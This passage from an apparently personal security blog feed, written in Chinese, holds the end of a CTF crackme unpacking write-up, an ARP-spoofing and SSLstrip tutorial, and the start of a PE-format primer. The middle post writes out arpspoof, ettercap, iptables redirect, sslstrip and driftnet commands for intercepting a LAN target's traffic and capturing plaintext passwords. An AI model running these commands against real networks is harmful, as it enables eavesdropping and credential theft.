href="https://i.loli.net/2018/07/15/5b4b6580cc0cc.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b6580cc0cc.jpg" class="lazyload"></a></p><p>在ESP右击，选择数据窗口中跟随</p><p><a href="https://i.loli.net/2018/07/15/5b4b6580df236.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b6580df236.jpg" class="lazyload"></a></p><p>跟踪这个值</p><p>选中46 02 00 00这四个字节，右击断点，硬件访问，Dword，选择</p><p>然后F9运行，跳转到这儿</p><p><a href="https://i.loli.net/2018/07/15/5b4b6581003d2.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b6581003d2.jpg" class="lazyload"></a></p><p>看到了这个长跳转，知道了401336离OEP很近了，单步F8，再次单步</p><p><a href="https://i.loli.net/2018/07/15/5b4b6581150e7.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b6581150e7.jpg" class="lazyload"></a></p><p>所以，1621是OEP的RVA</p><p>接下来是用PETools来DUMP文件</p><p>在PETools选中这个crackme，右击选择，完整转存</p><p>然后是使用Import REC</p><p><a href="https://i.loli.net/2018/07/15/5b4b658127cbc.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b658127cbc.jpg" class="lazyload"></a></p><p>点击IAT AutoSearch，Get Imports</p><p>然后把OEP改成1621</p><p><a href="https://i.loli.net/2018/07/15/5b4b65813cf35.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b65813cf35.jpg" class="lazyload"></a></p><p>Fix Dump</p><p>选中刚才Dump的文件<br><a href="https://i.loli.net/2018/07/15/5b4b65815165f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b65815165f.jpg" class="lazyload"></a></p><p>然后再使用PETools</p><p>Tools - Rebuild PE，重建那个DUMP文件<br><a href="https://i.loli.net/2018/07/15/5b4b659ad5787.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b659ad5787.jpg" class="lazyload"></a></p><p>脱壳成功</p><p>IDA查看Strings，发现有error和right：</p><p><a href="https://i.loli.net/2018/07/15/5b4b659ae8c4d.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b659ae8c4d.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/15/5b4b659b090f5.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/15/5b4b659b090f5.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/15/5b4b659b1d992.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b659b1d992.jpg" class="lazyload"></a><br>开头的t就是74h换算过来的ASCII码116，摁R就能看到</p><p>Python脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serial_1 = <span class="string">"this_is_not_flag"</span></span><br><span class="line">serial_2 = [<span class="number">0x12</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0x14</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0x4a</span>,<span class="number">0x3d</span>,<span class="number">0x56</span>,<span class="number">0xa</span>,<span class="number">0x10</span>,<span class="number">0x67</span>,<span class="number">0</span>,<span class="number">0x41</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x46</span>,<span class="number">0x5a</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x6e</span>,<span class="number">0x0c</span>,<span class="number">0x44</span>,<span class="number">0x72</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x40</span>,<span class="number">0x3e</span>,<span class="number">0x4b</span>,<span class="number">0x5f</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x4c</span>,<span class="number">0x5e</span>,<span class="number">0x5b</span>,<span class="number">0x17</span>,<span class="number">0x6e</span>,<span class="number">0xc</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x5b</span>,<span class="number">0x12</span>,<span class="number">0x48</span>,<span class="number">0x0e</span>]</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">42</span>):</span><br><span class="line">    result += chr(serial_2[i] ^ ord(serial_1[i%<span class="number">16</span>]))</span><br><span class="line">    <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure></div><p>  得出</p><p>  flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第三届上海市大学生网络安全大赛crackme&quot;&gt;&lt;a href=&quot;#第三届上海市大学生网络安全大赛crackme&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
    <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ARP欺骗</title>
    <link href="https://kabeor.github.io/ARP%E6%AC%BA%E9%AA%97%E5%92%8CSSLstrip/"/>
    <id>https://kabeor.github.io/ARP%E6%AC%BA%E9%AA%97%E5%92%8CSSLstrip/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:38:10.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><h2 id="1-Kali的网络配置"><a href="#1-Kali的网络配置" class="headerlink" title="1.Kali的网络配置"></a>1.Kali的网络配置</h2><blockquote><p><strong>上网方式</strong></p><p>  1.桥接   （宽带下不可用！！！）</p></blockquote><p><strong><em>虚拟机与主机在同一个网段中</em></strong>，并且也要为虚拟机分配一个IP地址（不要与主机IP地址相同，也不要与主机所在局域网中的其他计算机IP地址相同），为虚拟机设置子网掩码、网关地址、DNS地址。除了IP地址不同，其他都相同。</p><blockquote><p>2.NAT</p></blockquote><p>虚拟机使用“NAT”（即VMnet8）虚拟网卡，并且在虚拟机中设置为“自动获得地址”，虚拟机就可以上网</p><blockquote><p><strong>网络故障问题的解决方法</strong></p><p>1.查看自己ip地址、子网掩码等信息</p></blockquote><pre><code>ifconfig </code></pre><p>如不显示inet地址，则可能是smbd.server没开，应输入</p><pre><code>/etc/init.d/smbd start</code></pre><p>或输入</p><pre><code>dhclient eth0</code></pre><p>命令来获取IP地址<br>再输入ifconfig命令，就能看到eth0已经有IP地址了</p><blockquote><p>2.配置网络</p></blockquote><pre><code>vi /etc/network/interfaces</code></pre><p>修改为如下形式<br>            #This file describes the network interfaces available on your system<br>            # and how to activate them. For more information, see interfaces(5).</p><pre><code># The loopback network interface auto lo iface lo inet loopback# The primary network interfaceallow-hotplug eth0iface eth0 inet static                //配置eth0使用默认的静态地址# address 192.168.0.133        //设置eth0的IP地址# netmask 255.255.255.0          //配置eth0的子网掩码# gateway 192.168.0.254        //配置当前主机的默认网关  waddress ether 00:50:56:3D:9E:D2      //配置MAC地址</code></pre><p>修改文件夹内文本数据时用vi命令，i键进入修改模式，修改后按ESC退出修改模式，输入 ：w 保存，输入 ：q 退出文件</p><blockquote><p>配置DNS</p></blockquote><p>Kali Linux的DNS服务器地址使用文件“/etc/resovl.conf”进行配置，用户可以通过“nameserver”配置项设置DNS服务器的 IP地址；<br>“resolv.conf”文件中最多可以使用“nameserver”指定３个DNS服务器，按照先后的顺序，一旦前面的DNS服务器失效，系统将自动使用后面的DNS服务器。<br>对于“resolv.conf”文件设置“nameserver”的修改是即时生效的，即只要对“resolv.conf”文件的修改进行了保存，在系统下一次需要进行域名的解析时就会按照该文件中指定的DNS服务器IP地址进行域名的解析。</p><pre><code>vi /etc/resovl.conf</code></pre><p>修改格式如下<br>         # Generated by NetworkManager<br>         nameserver 192.168.229.2     //Nat模式下为虚拟机网卡IP，桥接模式下为主机分配的IP<br>         nameserver 114.114.114.114<br>         nameserver 8.8.8.8</p><blockquote><p>重启网卡</p></blockquote><pre><code>/etc/init.d/networking restart</code></pre><blockquote><p>ping</p></blockquote><pre><code>ping 114.114.114.114ping 8.8.8.8</code></pre><h2 id="2-ARP欺骗方法"><a href="#2-ARP欺骗方法" class="headerlink" title="2.ARP欺骗方法"></a>2.ARP欺骗方法</h2><blockquote><p>nmap扫描内网主机</p></blockquote><pre><code>nmap -sP 192.168.0.0/24</code></pre><p>查看目标主机操作系统信息</p><pre><code>nmap -O 192.168.0.133</code></pre><blockquote><p>开启流量转发功能</p></blockquote><pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></pre><blockquote><p>使用arpspoof或ettercap，选一个进行arp欺骗。获取从192.168.0.1（路由器） 到 192.168.0.21（目标机）的流量。</p></blockquote><p>使用arpspoof（无线网络下，有线网络则先ip，后网关）：</p><pre><code>arpspoof -i eth0 -t 192.168.1.1(网关) 192.168.1.*(ip)arpspoof -i eth0 -t 192.168.0.1  192.168.0.21</code></pre><p>使用ettercap：</p><pre><code>ettercap -T -q -M ARP /192.168.0.21// ///</code></pre><blockquote><p>driftnet图片流量监控</p></blockquote><pre><code>driftnet -i eth0</code></pre><h1 id="SSLstrip（利用parrot）"><a href="#SSLstrip（利用parrot）" class="headerlink" title="SSLstrip（利用parrot）#"></a>SSLstrip（利用parrot）#</h1><h2 id="1-parrot配置"><a href="#1-parrot配置" class="headerlink" title="1.parrot配置##"></a>1.parrot配置##</h2><blockquote><p>parrot的软件安装</p></blockquote><pre><code>apt-get install 工具名apt-get install parrot-tools-full                          //将装入full版parrot</code></pre><p>更换更新源<br>        vi /etc/apt/sources.list.d/parrot.list</p><p>中科大源<br>        #stable repository<br>        deb <a href="http://mirrors.ustc.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/parrot/</a> parrot main contrib non-free<br>        #deb-src <a href="http://mirrors.ustc.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/parrot/</a> parrot main contrib non-free<br>清华源<br>        #stable repository<br>        deb <a href="http://mirrors.tuna.tsinghua.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/parrot/</a> parrot main contrib non-free<br>        #deb-src <a href="http://mirrors.tuna.tsinghua.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/parrot/</a> parrot main contrib non-free</p><p>安装VMtools</p><pre><code>sudo apt-get updatesudo apt-get install open-vm-tools-desktop fuse然后重新登录</code></pre><blockquote><p>parrot网络配置</p></blockquote><p>同kali（vim出现某些问题，需到相应路径下以管理员身份打开）</p><blockquote><p>流量转发（以下需在root模式下）</p></blockquote><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><blockquote><p>配置路由表(iptables),把80端口的数据传送到8080端口,也就是SSL欺骗需要监听的端口</p></blockquote><pre><code>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</code></pre><blockquote><p>显示网关地址</p></blockquote><pre><code>route -n</code></pre><blockquote><p>nmap</p></blockquote><pre><code>nmap -sP [网关地址]/24</code></pre><blockquote><p>欺骗</p></blockquote><pre><code>arpspoof -i [网卡] -t [目标ip] [网关ip]arpspoof -i eth0 -t 192.168.1.100 192.168.0.1</code></pre><p>在使用arpspoof进行流量转发的时候</p><p>如果目标机器是使用无线连接的网络,则需要反向转发，即先网关，后ip</p><p>命令应该为:</p><pre><code>arpspoof -i eth0 -t 192.168.1.1(网关) 192.168.1.*(ip)</code></pre><blockquote><p>监听</p></blockquote><pre><code>sslstrip -l 8080</code></pre><blockquote><p>查看报文</p></blockquote><pre><code>cat sslstrip.log</code></pre><blockquote><p>实时截获http明文传输的密码</p></blockquote><pre><code>ettercap -Tq -i eth0</code></pre><h1 id="Wireshark报错解决方案"><a href="#Wireshark报错解决方案" class="headerlink" title="Wireshark报错解决方案"></a>Wireshark报错解决方案</h1><p>解决方案：修改init.lua</p><p>直接运行wireshark的话会报错：</p><p>Lua: Error during loading:<br>[string “/usr/share/wireshark/init.lua”]:45: dofile has been disabled</p><p>要对其进行修改，终端运行</p><pre><code>sudo vi /usr/share/wireshark/init.lua</code></pre><p>倒数第二行原来为：dofile(DATA_DIR..”console.lua”)</p><p>改为     </p><pre><code>--dofile(DATA_DIR..&quot;console.lua&quot;)</code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;ARP欺骗&quot;&gt;&lt;a href=&quot;#ARP欺骗&quot; class=&quot;headerlink&quot; title=&quot;ARP欺骗&quot;&gt;&lt;/a&gt;ARP欺骗&lt;/h1&gt;&lt;h2 id=&quot;1-Kali的网络配置&quot;&gt;&lt;a href=&quot;#1-Kali的网络配置&quot;</summary>
        
      
    
    
    
    <category term="Linux" scheme="https://kabeor.github.io/categories/Linux/"/>
    
    <category term="Kali" scheme="https://kabeor.github.io/categories/Linux/Kali/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="ARP欺骗" scheme="https://kabeor.github.io/tags/ARP%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>PE文件简介</title>
    <link href="https://kabeor.github.io/PE%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B/"/>
    <id>https://kabeor.github.io/PE%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:47:23.172Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h1><p>PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）</p><p>PE文件是指32位可执行文件，也称为PE32。64位的可执行文件称为PE+或PE32+,是PE(PE32)的一种扩展形式（请注意不是PE64)。</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>(用个网上的图)<br><a href="https://i.loli.net/2018/07/14/5b49c771e2fd3.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49c771e2fd3.jpg" class="lazyload"></a></p><p> 1.DOS头是用来兼容MS-DOS操作系统的，目的是当这个文件在MS-DOS上运行时提示一段文字，大部分情况下是：This program cannot be run in DOS mode. 还有一个目的，就是指明NT头在文件中的位置。</p><p>2.NT头包含windows PE文件的主要信息，其中包括一个‘PE’字样的签名，PE文件头（IMAGE_FILE_HEADER）和PE可选头（IMAGE_OPTIONAL_HEADER32）。</p><p>3.节表：是PE文件后续节的描述，windows根据节表的描述加载每个节。</p><p>4.节：每个节实际上是一个容器，可以包含代码、数据等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个。</p><h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><ol><li><p>当一个PE文件被执行时，PE装载器首先检查DOS header里的PE header的偏移量。如果找到，则直接跳转到PE header的位置。</p></li><li><p>当PE装载器跳转到PE header后，第二步要做的就是检查PE header是否有效。如果该PE header有效，就跳转到PE header的尾部。</p></li><li><p>紧跟PE header尾部的是节表。PE装载器执行完第二步后开始读取节表中的节段信息，并采用文件映射（在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系）的方法将这些节段映射到内存，同时附上节表里指定节段的读写属性。</p></li><li><p>PE文件映射入内存后，PE装载器将继续处理PE文件中类似 import table （输入表）的逻辑部分</p></li></ol><p><a href="https://i.loli.net/2018/07/14/5b49c77220670.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49c77220670.jpg" class="lazyload"></a></p><p>当一个PE文件被加载到内存中以后，我们称之为“映象”（image），一般来说，PE文件在硬盘上和在内存里是不完全一样的，被加载到内存以后其占用的虚拟地址空间要比在硬盘上占用的空间大一些，这是因为各个节在硬盘上是连续的，而在内存中是按页对齐的，所以加载到内存以后节之间会出现一些“空洞”。</p><p>因为存在这种对齐，所以在PE结构内部，表示某个位置的地址采用了两种方式，针对在硬盘上存储文件中的地址，称为原始存储地址或物理地址表示距离文件头的偏移；另外一种是针对加载到内存以后映象中的地址，称为相对虚拟地址（RVA），表示相对内存映象头的偏移。</p><p>CPU的某些指令是需要使用绝对地址的，比如取全局变量的地址，传递函数的地址编译以后的汇编指令中肯定需要用到绝对地址而不是相对映象头的偏移，因此PE文件会建议操作系统将其加载到某个内存地址（这个叫基地址），编译器便根据这个地址求出代码中一些全局变量和函数的地址，并将这些地址用到对应的指令中。这种表示方式叫做虚拟地址（VA）。</p><p>文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。</p><p>VA指进程虚拟内存的绝对地址，RVA(Relative Virtual Address，相对虚拟地址)是指从某基准位置（ImageBase）开始的相对地址。VA与RVA满足下面的换算关系：</p><pre><code>RVA+ImageBase=VA</code></pre><p>PE头内部信息大多是RVA形式存在。原因在于（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他的PE文件（DLL）。此时必须通过重定向（Relocation）将其加载到其他空白的位置，若PE头信息使用的是VA，则无法正常访问。因此使用RVA来重定向信息，即使发生了重定向，只要相对于基准位置的相对位置没有变化，就能正常访问到指定信息，不会出现任何问题。</p><p>当PE文件被执行时，PE装载器会为进程分配4CG的虚拟地址空间，然后把程序所占用的磁盘空间作为虚拟内存映射到这个4GB的虚拟地址空间中。一般情况下，会映射到虚拟地址空间中的0X400000的位置。</p><h4 id="可执行文件头"><a href="#可执行文件头" class="headerlink" title="可执行文件头"></a>可执行文件头</h4><h6 id="1-DOS头"><a href="#1-DOS头" class="headerlink" title="1.DOS头"></a>1.DOS头</h6><p>DOS头的作用是兼容MS-DOS操作系统中的可执行文件，对于32位PE文件来说，DOS所起的作用就是显示一行文字，提示用户：我需要在32位windows上才可以运行。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定义</span><br><span class="line"></span><br><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header  </span><br><span class="line">    WORD   e_magic;                     &#x2F;&#x2F; Magic number  </span><br><span class="line">    WORD   e_cblp;                      &#x2F;&#x2F; Bytes on last page of file  </span><br><span class="line">    WORD   e_cp;                        &#x2F;&#x2F; Pages in file  </span><br><span class="line">    WORD   e_crlc;                      &#x2F;&#x2F; Relocations  </span><br><span class="line">    WORD   e_cparhdr;                   &#x2F;&#x2F; Size of header in paragraphs  </span><br><span class="line">    WORD   e_minalloc;                  &#x2F;&#x2F; Minimum extra paragraphs needed  </span><br><span class="line">    WORD   e_maxalloc;                  &#x2F;&#x2F; Maximum extra paragraphs needed  </span><br><span class="line">    WORD   e_ss;                        &#x2F;&#x2F; Initial (relative) SS value  </span><br><span class="line">    WORD   e_sp;                        &#x2F;&#x2F; Initial SP value  </span><br><span class="line">    WORD   e_csum;                      &#x2F;&#x2F; Checksum  </span><br><span class="line">    WORD   e_ip;                        &#x2F;&#x2F; Initial IP value  </span><br><span class="line">    WORD   e_cs;                        &#x2F;&#x2F; Initial (relative) CS value  </span><br><span class="line">    WORD   e_lfarlc;                    &#x2F;&#x2F; File address of relocation table  </span><br><span class="line">    WORD   e_ovno;                      &#x2F;&#x2F; Overlay number  </span><br><span class="line">    WORD   e_res[4];                    &#x2F;&#x2F; Reserved words  </span><br><span class="line">    WORD   e_oemid;                     &#x2F;&#x2F; OEM identifier (for e_oeminfo)  </span><br><span class="line">    WORD   e_oeminfo;                   &#x2F;&#x2F; OEM information; e_oemid specific  </span><br><span class="line">    WORD   e_res2[10];                  &#x2F;&#x2F; Reserved words  </span><br><span class="line">    LONG   e_lfanew;                    &#x2F;&#x2F; File address of new exe header  </span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure></div><p>我们只需要关注两个域：</p><p>e_magic：一个WORD类型，值是一个常数0x4D5A，用文本编辑器查看该值位‘MZ’，可执行文件必须都是’MZ’开头。</p><p>e_lfanew：为32位可执行文件扩展的域，用来表示DOS头之后的NT头相对文件起始地址的偏移。</p><h6 id="2-NT头（32位PE文件中最有用的头）"><a href="#2-NT头（32位PE文件中最有用的头）" class="headerlink" title="2.NT头（32位PE文件中最有用的头）"></a>2.NT头（32位PE文件中最有用的头）</h6><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定义</span><br><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;  </span><br><span class="line">    DWORD Signature;  </span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;  </span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;  </span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure></div><p>Signature：类似于DOS头中的e_magic，其高16位是0，低16是0x4550，用字符表示是’PE‘。</p><p>IMAGE_FILE_HEADER是PE文件头</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;  </span><br><span class="line">    WORD    Machine;  </span><br><span class="line">    WORD    NumberOfSections;  </span><br><span class="line">    DWORD   TimeDateStamp;  </span><br><span class="line">    DWORD   PointerToSymbolTable;  </span><br><span class="line">    DWORD   NumberOfSymbols;  </span><br><span class="line">    WORD    SizeOfOptionalHeader;  </span><br><span class="line">    WORD    Characteristics;  </span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure></div><h5 id="每个域的具体含义"><a href="#每个域的具体含义" class="headerlink" title="每个域的具体含义"></a>每个域的具体含义</h5><blockquote><p>Machine：该文件的运行平台，是x86、x64还是I64等等，可以是下面值里的某一个。</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_MACHINE_UNKNOWN           0  </span><br><span class="line">#define IMAGE_FILE_MACHINE_I386              0x014c  &#x2F;&#x2F; Intel 386.  </span><br><span class="line">#define IMAGE_FILE_MACHINE_R3000             0x0162  &#x2F;&#x2F; MIPS little-endian, 0x160 big-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_R4000             0x0166  &#x2F;&#x2F; MIPS little-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_R10000            0x0168  &#x2F;&#x2F; MIPS little-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  &#x2F;&#x2F; MIPS little-endian WCE v2  </span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA             0x0184  &#x2F;&#x2F; Alpha_AXP  </span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3               0x01a2  &#x2F;&#x2F; SH3 little-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3DSP            0x01a3  </span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3E              0x01a4  &#x2F;&#x2F; SH3E little-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_SH4               0x01a6  &#x2F;&#x2F; SH4 little-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_SH5               0x01a8  &#x2F;&#x2F; SH5  </span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM               0x01c0  &#x2F;&#x2F; ARM Little-Endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_THUMB             0x01c2  </span><br><span class="line">#define IMAGE_FILE_MACHINE_AM33              0x01d3  </span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPC           0x01F0  &#x2F;&#x2F; IBM PowerPC Little-Endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPCFP         0x01f1  </span><br><span class="line">#define IMAGE_FILE_MACHINE_IA64              0x0200  &#x2F;&#x2F; Intel 64  </span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPS16            0x0266  &#x2F;&#x2F; MIPS  </span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA64           0x0284  &#x2F;&#x2F; ALPHA64  </span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU           0x0366  &#x2F;&#x2F; MIPS  </span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  &#x2F;&#x2F; MIPS  </span><br><span class="line">#define IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64  </span><br><span class="line">#define IMAGE_FILE_MACHINE_TRICORE           0x0520  &#x2F;&#x2F; Infineon  </span><br><span class="line">#define IMAGE_FILE_MACHINE_CEF               0x0CEF  </span><br><span class="line">#define IMAGE_FILE_MACHINE_EBC               0x0EBC  &#x2F;&#x2F; EFI Byte Code  </span><br><span class="line">#define IMAGE_FILE_MACHINE_AMD64             0x8664  &#x2F;&#x2F; AMD64 (K8)  </span><br><span class="line">#define IMAGE_FILE_MACHINE_M32R              0x9041  &#x2F;&#x2F; M32R little-endian  </span><br><span class="line">#define IMAGE_FILE_MACHINE_CEE               0xC0EE</span><br></pre></td></tr></table></figure></div><blockquote><p>NumberOfSections：该PE文件中有多少个节，也就是节表中的项数。</p></blockquote><blockquote><p>TimeDateStamp：PE文件的创建时间，一般有连接器填写。</p></blockquote><blockquote><p>PointerToSymbolTable：COFF文件符号表在文件中的偏移。</p></blockquote><blockquote><p>NumberOfSymbols：符号表的数量。</p></blockquote><blockquote><p>SizeOfOptionalHeader：紧随其后的可选头的大小。</p></blockquote><blockquote><p>Characteristics：可执行文件的属性，可以是下面这些值按位相或。</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  &#x2F;&#x2F; Relocation info stripped from file.  </span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  &#x2F;&#x2F; File is executable  (i.e. no unresolved externel references).  </span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  &#x2F;&#x2F; Line nunbers stripped from file.  </span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  &#x2F;&#x2F; Local symbols stripped from file.  </span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  &#x2F;&#x2F; Agressively trim working set  </span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  &#x2F;&#x2F; App can handle &gt;2gb addresses  </span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  &#x2F;&#x2F; Bytes of machine word are reversed.  </span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  &#x2F;&#x2F; 32 bit word machine.  </span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  &#x2F;&#x2F; Debugging info stripped from file in .DBG file  </span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  &#x2F;&#x2F; If Image is on removable media, copy and run from the swap file.  </span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  &#x2F;&#x2F; If Image is on Net, copy and run from the swap file.  </span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  &#x2F;&#x2F; System File.  </span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  &#x2F;&#x2F; File is a DLL.  </span><br><span class="line">#define 